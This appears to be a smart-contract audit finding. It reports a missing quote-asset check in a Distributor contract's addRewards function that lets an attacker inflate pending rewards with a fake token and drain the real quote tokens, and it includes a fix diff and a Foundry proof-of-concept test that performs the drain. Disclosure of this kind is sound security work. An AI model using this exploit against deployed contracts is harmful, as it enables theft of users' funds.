# Possible to drain all quotetoken in Distributor

### Severity: High

### Line of Code

https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L106

### Summary

The `addRewards` function in Distributor.sol does not properly validate the input quoteAsset. As a result, an attacker can artificially increase `pendingQuoteRewards` in RewardsPoolData, which may lead to draining all quote tokens.

### Find Description

It is possible that we create a fakeAsset and mint ourselves LARGE amount. Then call 

`Distributor.addRewards(launchAsset, fakeAsset, 0, LARGE)`

Since there is no validation on the fakeasset imposed, 

`rs.addQuoteRewards(launchAsset, fakeAsset, LARGE);` on line 128 will be triggered, which increases the `pendingQuoteRewards` in RewardsPoolData for launchAsset by LARGE. The consequence of this vulnerability is that RewardsPoolData records the amount as if it were the quoteAsset in the pending rewards, but it actually receives our fakeAsset.

### Impact

The attacker can easily drain all the quote tokens from the distributor, likely across different reward pools if they share the same quote token, by taking the following steps: (Since there is no access control, anyone can call the functions mentioned below)

1. call `addRewards` with fakeasset to increase pendingQuoteRewards to a large value

2. Make sure has at least one share in the RewardPoolData for the launchtoken and call the `claimRewards`.

The attacker can receive following amount of quoteasset

$$ \Big(\frac{\text{pendingQuoteRewards}}{\text{totalShares}} + \text{accQuoteRewardPerShare}\Big) \times \text{attack's share} $$

Since the attacker is able to manipulate `pendingQuoteRewards` using the fakeasset, they can drain all the quotetoken in the Distributor. 

### Recommended Mitigation

```diff
diff --git a/Distributor.sol.orig b/Distributor.sol
index 3949dba..8c864e6 100755
--- a/Distributor.sol.orig
+++ b/Distributor.sol
@@ -22,6 +22,7 @@ contract Distributor is OwnableRoles, IDistributor {
     error ClaimAmountExceedsTotalPendingRewards();
     error NoSharesToIncentivize();
     error SkimOverflow();
+    error InvalidQuoteAsset(address expected, address provided);
 
     uint256 public constant ADMIN_ROLE = _ROLE_0;
 
@@ -116,6 +117,8 @@ contract Distributor is OwnableRoles, IDistributor {
             (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
         }
 
+        if (quoteAsset != rs.quoteAsset) revert InvalidQuoteAsset(rs.quoteAsset, quoteAsset);
+
         if (rs.totalShares == 0) revert NoSharesToIncentivize();
 
         if (launchAssetAmount > 0) {
```

### PoC

Copy the following code into `test/c4-poc/PoCLaunchPad.t.sol` and run `forge test --match-test test_submissionValidity`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {LaunchpadTestBase} from "./LaunchpadTestBase.sol";
import {ERC20Harness} from "../harnesses/ERC20Harness.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import "contracts/launchpad/libraries/RewardsTracker.sol";

contract PoCLaunchpad is LaunchpadTestBase {
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * - factory: ERC1967Factory.sol 
     * - launchpad: Launchpad.sol
     * - distributor: Distributor.sol
     * - curve: SimpleBondingCurve.sol
     * - launchpadLPVault: LaunchpadLPVault.sol
     * - quoteToken: Quote token used in Launchpad system
     * - uniV2Router: Uniswap V2 Router used in Launchpad system
     */

    function test_submissionValidity() external {      
        /*
            We test the following logic:

            We have Evil and Bob, each has 1 share in the distributor. 
            The distributor has 2 ether of pendingrewards of quotetoken. 

            Evil creates a fakeToken and add 2 ether of it to the distributor. 
            This trickes the corresponeding rewardPool think it has 2 + 2 = 4 ether of pendingRewards.

            Evil calls claim, take 50% * 4 = 2 ether of the quotetoken, which is all the quotetoken
            in the distributor. Bob can no longer claim the 1 quoteToken that belong to him. 
        */        
       
        address evil = makeAddr("Evil");
        address bob = makeAddr("Bob");
        vm.startPrank(address(launchpad));
        Distributor(distributor).increaseStake(token, bob, 1);
        Distributor(distributor).increaseStake(token, evil, 1);
        vm.stopPrank();
        quoteToken.mint(bob, 2 ether);
        vm.startPrank(bob);
        quoteToken.approve(address(distributor), type(uint128).max);
        Distributor(distributor).addRewards(token, address(quoteToken), 0, 2 ether);
        vm.stopPrank();

        vm.startPrank(evil);
        ERC20Harness fakeToken = new ERC20Harness("Fake", "FK");
        fakeToken.mint(evil, 2 ether);
        fakeToken.approve(address(distributor), type(uint128).max);
        Distributor(distributor).addRewards(token, address(fakeToken), 0, 2 ether);
        Distributor(distributor).claimRewards(token);
        vm.stopPrank();

        assertEq(quoteToken.balanceOf(evil), 2 ether);
        assertEq(quoteToken.balanceOf(distributor), 0);
    }
}
```